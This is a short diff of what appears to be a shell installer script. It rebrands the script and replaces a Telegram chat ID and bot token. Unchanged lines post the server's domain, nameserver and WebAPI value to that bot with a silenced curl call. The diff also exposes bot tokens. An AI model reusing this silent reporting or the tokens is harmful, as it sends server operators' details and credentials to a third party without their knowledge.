@@ -853,10 +853,10 @@ Domain: $domain
 Namserver: $nsdomain
 WebAPI: $api773
 =========================
-@fn_project Autoscript
+@medusaXD Autoscript
 "
-CHATID="6369685620"
-KEY="6981433170:AAFhh3UQi2H_lsJiAjGEMoj4xad2TdNHQfI"
+CHATID="7527795504"
+KEY="8264263050:AAHTg7mmKtMSCn9z6brAuzrteGPJyaopg14"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 curl -s --max-time $TIME --data-urlencode "chat_id=$CHATID" --data-urlencode "text=$OUTPUT" $URL >/dev/null 2>&1
